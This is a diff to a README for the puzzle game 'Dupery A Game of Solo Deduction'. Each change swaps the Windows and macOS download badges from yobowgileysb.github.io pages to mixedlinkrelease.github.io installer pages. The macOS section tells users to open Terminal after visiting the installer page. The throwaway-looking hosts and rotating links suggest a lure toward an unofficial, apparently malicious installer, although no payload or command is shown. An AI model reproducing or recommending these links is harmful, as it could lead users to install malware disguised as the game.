@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Dupery A Game of Solo Deduction](https://img.shields.io/badge/⬇_Download_Dupery%20A%20Game%20of%20Solo%20Deduction-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Dupery A Game of Solo Deduction](https://img.shields.io/badge/⬇_Download_Dupery%20A%20Game%20of%20Solo%20Deduction-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -61,9 +61,9 @@ Dupery is an elegant solo deduction puzzle game where you unravel mysteries by g
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -81,7 +81,7 @@ Dupery is an elegant solo deduction puzzle game where you unravel mysteries by g
 
 <div align="center">
 
-[![⬇ Download Dupery A Game of Solo Deduction](https://img.shields.io/badge/⬇_Download_Dupery%20A%20Game%20of%20Solo%20Deduction-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Dupery A Game of Solo Deduction](https://img.shields.io/badge/⬇_Download_Dupery%20A%20Game%20of%20Solo%20Deduction-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -113,7 +113,7 @@ Dupery is an elegant solo deduction puzzle game where you unravel mysteries by g
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -138,7 +138,7 @@ Dupery is an elegant solo deduction puzzle game where you unravel mysteries by g
 
 <div align="center">
 
-[![⬇ Download Dupery A Game of Solo Deduction](https://img.shields.io/badge/⬇_Download_Dupery%20A%20Game%20of%20Solo%20Deduction-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Dupery A Game of Solo Deduction](https://img.shields.io/badge/⬇_Download_Dupery%20A%20Game%20of%20Solo%20Deduction-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
